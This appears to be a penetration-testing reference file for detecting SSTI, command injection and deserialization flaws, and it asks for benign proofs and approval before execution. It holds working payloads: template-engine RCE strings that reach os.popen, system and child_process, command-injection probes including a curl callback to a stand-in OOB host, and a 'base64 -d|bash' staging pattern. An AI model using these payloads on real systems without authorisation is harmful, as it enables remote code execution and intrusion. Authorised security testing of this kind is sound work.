# Injection detection + benign-proof payloads (shared by ssti / command-injection / deserialization)
# Confirm with BENIGN proofs (arithmetic, sleep, OOB). NO destructive RCE. Approval-gated for exec.

## SSTI — engine detection via math, then identify
```
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  ${{7*7}}  @(7*7)  #{7*7}
```
49 (or a template error) = template-evaluated. Then fingerprint:
```
{{7*'7'}}        -> 7777777 = Jinja2/Twig (python/php) ; 49 only = Java (freemarker/velocity)
${7*7}           -> Freemarker/Velocity/Spring EL
#{7*7}           -> Ruby ERB-ish / JSF EL
```
Benign engine-specific proof (NOT RCE): e.g. Jinja2 `{{ config }}`; confirm sandbox vs escape before any exec.

## Command injection — benign confirmation
```
;id            |id            `id`           $(id)          %0aid
; sleep 5      && ping -c1 OOB    | curl http://OOB/
# blind: OOB (DNS/HTTP to collaborator) or timing (sleep). PREFER OOB/sleep over `id` output.
```

## Deserialization — markers + OOB
```
Java:   rO0AB...        (base64 of \xac\xed\x00\x05 serialized header)  — ysoserial gadgets (URLDNS for benign OOB)
PHP:    O:4:"User":...   (serialized object) ; __wakeup/__destruct gadgets
Python: pickle opcodes (c__builtin__\neval...) — DANGEROUS, use a BENIGN OOB gadget only
.NET:   TypeConfuseDelegate / ViewState (__VIEWSTATE) ; ysoserial.net
Node:   __proto__ / serialized function (node-serialize) — OOB marker
```
Confirm deserialization benignly: a **URLDNS-style** gadget that only triggers a DNS/HTTP callback
(no code exec) proves the sink deserializes attacker data. Escalate to a real gadget ONLY with approval.

## OOB
Embed a unique `TOKEN.oob.example` so blind exec/deserialization is attributable. Confirm execution by
the callback (JS/command output or DNS), never by running destructive commands.

---
## 0daysec enrichment (adapted from the user's SSTI/injection notes)

### SSTI → RCE by engine (benign proof FIRST: `id` / OOB, not a shell)
```
# Jinja2 (Python) — globals walk to os:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
#   filter-restricted env: build the command without quotes/spaces via request(), or stage a benign
#   base64 payload:  echo <base64>|base64 -d|bash   (reference pattern — use an OOB/`id` proof here)
# Twig (PHP):   {{['id']|filter('system')}}        {{['id']|map('system')|join}}
# Smarty (PHP): {system('id')}      {php}system('id');{/php}   {Smarty_Internal_Write_File::writeFile(...)}
# Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity:     #set($e=$x.class.forName('java.lang.Runtime')...) (engine-specific gadget)
# Pug/Jade (Node): #{global.process.mainModule.require('child_process').execSync('id')}
# ERB (Ruby):   <%= `id` %>        <%= system('id') %>
```
Tool: `SSTImap -u '<url>' ...` (confirm manually; keep proofs benign). Chain confirmed RCE to the
`command-injection` verifier criteria (OOB/timing, no destructive command).
